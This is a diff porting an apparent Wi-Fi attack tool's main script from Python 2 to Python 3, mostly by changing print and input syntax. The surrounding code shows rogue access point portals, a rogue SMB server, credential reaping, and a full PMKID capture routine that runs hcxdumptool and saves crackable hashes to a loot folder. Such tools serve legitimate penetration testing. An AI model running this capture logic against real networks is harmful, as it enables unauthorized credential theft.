@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 import argparse
 import core.cli
@@ -34,26 +34,26 @@ def cert_wizard():
         print ('[*] Please enter two letter country '
                             'code for certs (i.e. US, FR)')
 
-        country = raw_input(': ').upper()
+        country = input(': ').upper()
         if len(country) == 2:
             break
-        print '[!] Invalid input.'
+        print('[!] Invalid input.')
 
     print ('[*] Please enter state or province for '
                         'certs (i.e. Ontario, New Jersey)')
-    state = raw_input(': ')
+    state = input(': ')
 
-    print '[*] Please enter locale for certs (i.e. London, Hong Kong)'
-    locale = raw_input(': ')
+    print('[*] Please enter locale for certs (i.e. London, Hong Kong)')
+    locale = input(': ')
 
-    print '[*] Please enter organization for certs (i.e. Evil Corp)'
-    org = raw_input(': ')
+    print('[*] Please enter organization for certs (i.e. Evil Corp)')
+    org = input(': ')
 
-    print '[*] Please enter email for certs (i.e. cyberz@h4x0r.lulz)'
-    email = raw_input(': ')
+    print('[*] Please enter email for certs (i.e. cyberz@h4x0r.lulz)')
+    email = input(': ')
 
-    print '[*] Please enter common name (CN) for certs.'
-    cn = raw_input(': ')
+    print('[*] Please enter common name (CN) for certs.')
+    cn = input(': ')
 
     cert_manager.ca_cnf.configure(country, state, locale, org, email, cn)
     cert_manager.server_cnf.configure(country, state, locale, org, email, cn)
@@ -109,7 +109,7 @@ def hostile_portal():
         # start Responder
         if use_pivot:
 
-            print '[*] Pivot mode activated. Rogue SMB server disabled.'
+            print('[*] Pivot mode activated. Rogue SMB server disabled.')
             print ('[*] Run payload_generator to '
                         'generate a timed payload if desired.')
 
@@ -133,7 +133,7 @@ def hostile_portal():
         utils.Iptables.route_http2_addr('10.0.0.1', interface)
 
         # pause execution until user quits
-        raw_input('\n\nPress enter to quit...\n\n')
+        input('\n\nPress enter to quit...\n\n')
 
         hostapd.stop()
         services.Dnsmasq.kill()
@@ -233,7 +233,7 @@ def captive_portal():
         utils.Iptables.route_http2_addr('10.0.0.1', interface)
         
         # pause execution until user quits
-        raw_input('\n\nPress enter to quit...\n\n')
+        input('\n\nPress enter to quit...\n\n')
 
         hostapd.stop()
         services.Dnsmasq.kill()
@@ -308,7 +308,7 @@ def reap_creds():
         hostapd.start()
 
         # pause execution until user quits  
-        raw_input('\n\nPress enter to quit...\n\n')
+        input('\n\nPress enter to quit...\n\n')
 
         hostapd.stop()
         if use_autocrack:
@@ -354,9 +354,9 @@ def pmkid_attack():
     interface.mode_managed()
     interface.up()
 
-    print '[*] Scanning for nearby access points...'
+    print('[*] Scanning for nearby access points...')
     networks = iw_parse.iw_parse.get_interfaces(interface=str(interface))
-    print '[*] Complete!'
+    print('[*] Complete!')
     time.sleep(.5)
 
     interface.down()
@@ -366,59 +366,59 @@ def pmkid_attack():
     if bssid is not None:
 
         if channel is None:
-            print '[*] No channel specified... finding appropriate channel...'
+            print('[*] No channel specified... finding appropriate channel...')
             channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
             if channel is None:
-                print '[!] Target network not found... aborting...'
+                print('[!] Target network not found... aborting...')
                 sys.exit()
-            print '[*] Channel %d selected...' % channel
-            print '[*] Complete!'
+            print('[*] Channel %d selected...' % channel)
+            print('[*] Complete!')
         
         essid = iw_parse.helper_functions.find_essid_from_bssid(bssid, networks)
         if essid is None:
-            print '[!] Target network is hidden...'
+            print('[!] Target network is hidden...')
             essid = ''
     
     elif essid is not None:
 
-        print '[*] No bssid or channel specified...'
-        print '[*] ... searching for AP that has ESSID %s...' % essid
+        print('[*] No bssid or channel specified...')
+        print('[*] ... searching for AP that has ESSID %s...' % essid)
         bssid = iw_parse.helper_functions.find_bssid_from_essid(essid, networks)
         if bssid is None:
-            print '[!] Target network not found... aborting...'
+            print('[!] Target network not found... aborting...')
             sys.exit()
-        print '[*] BSSID %s selected...' % bssid
+        print('[*] BSSID %s selected...' % bssid)
         channel = iw_parse.helper_functions.find_channel_from_bssid(bssid, networks)
         if channel is None:
-            print '[!] Target network not found... aborting...'
+            print('[!] Target network not found... aborting...')
             sys.exit()
-        print '[*] Channel %d selected...' % channel
-        print '[*] Complete!'
+        print('[*] Channel %d selected...' % channel)
+        print('[*] Complete!')
     
     else:
         raise Exception('BSSID or ESSID must be specified')
 
-    print '[*] Creating filter file for target...'
+    print('[*] Creating filter file for target...')
     with open(hcxdumptool_filter, 'w') as fd:
         fd.write('%s' % bssid.replace(':', ''))
-    print '[*] Complete!'
+    print('[*] Complete!')
 
-    print '[*] Running hcxdumptool...'
+    print('[*] Running hcxdumptool...')
     p = subprocess.Popen('%s -i %s -c %d -o %s --filtermode=2 --filterlist=%s --enable_status=3' % (hcxdumptool, interface, channel, hcxdumptool_ofile, hcxdumptool_filter), shell=True, stdout=subprocess.PIPE, preexec_fn=os.setsid)
     while True:
         line = p.stdout.readline()
-        print line,
+        print(line, end=' ')
         if 'FOUND PMKID CLIENT-LESS]' in line:
             break
     os.killpg(os.getpgid(p.pid), signal.SIGTERM)
-    print '[*] Complete!'
+    print('[*] Complete!')
 
-    print '[*] Extracting hash from pcap file using hcxpcaptool...'
+    print('[*] Extracting hash from pcap file using hcxpcaptool...')
     os.system('%s -z %s %s' % (hcxpcaptool, hcxpcaptool_ofile, hcxdumptool_ofile))
     with open(hcxpcaptool_ofile) as fd:
         hash_str = fd.read()
-        print '\thashcat format:', hash_str
-    print '[*] Complete!'
+        print('\thashcat format:', hash_str)
+    print('[*] Complete!')
 
     save_file = os.path.join(loot_dir, '-'.join([
             essid,
@@ -427,25 +427,25 @@ def pmkid_attack():
             'PMKID.txt',
     ]))
     
-    print '[*] Saving hash to %s' % save_file
+    print('[*] Saving hash to %s' % save_file)
     with open(save_file, 'w') as fd:
         fd.write(hash_str)
-    print '[*] Complete!'
+    print('[*] Complete!')
 
-    print '[*] Removing temporary files...'
+    print('[*] Removing temporary files...')
     try:
         os.remove(hcxpcaptool_ofile)
     except OSError as e:
-        print "Error: %s - %s" % (e.filename, e.strerror)
+        print("Error: %s - %s" % (e.filename, e.strerror))
     try:
         os.remove(hcxdumptool_filter)
     except OSError as e:
-        print "Error: %s - %s" % (e.filename, e.strerror)
+        print("Error: %s - %s" % (e.filename, e.strerror))
     try:
         os.remove(hcxdumptool_ofile)
     except OSError as e:
-        print "Error: %s - %s" % (e.filename, e.strerror)
-    print '[*] Complete!'
+        print("Error: %s - %s" % (e.filename, e.strerror))
+    print('[*] Complete!')
 
 def eap_spray():
 
@@ -486,7 +486,7 @@ def save_config_only():
 def print_banner():
 
 
-    print '''
+    print('''
                      .__                                         
   ____ _____  ______ |  |__ _____    _____   _____   ___________ 
 _/ __ \\\\__  \\ \\____ \\|  |  \\\\__  \\  /     \\ /     \\_/ __ \\_  __ \\
@@ -497,7 +497,7 @@ _/ __ \\\\__  \\ \\____ \\|  |  \\\\__  \\  /     \\ /     \\_/ __ \\_  __ \\
                             "Unrelenting Force"
 
                                 v%s
-    ''' % (__version__)
+    ''' % (__version__))
 
 if __name__ == '__main__':
 
@@ -506,10 +506,10 @@ if __name__ == '__main__':
     options = core.cli.set_options()
 
     if options['debug']:
-        print '[debug] Settings:'
-        print json.dumps(settings.dict, indent=4, sort_keys=True)
-        print '[debug] Options:'
-        print json.dumps(options, indent=4, sort_keys=True)
+        print('[debug] Settings:')
+        print(json.dumps(settings.dict, indent=4, sort_keys=True))
+        print('[debug] Options:')
+        print(json.dumps(options, indent=4, sort_keys=True))
 
     if options['cert_wizard']:
         cert_wizard()
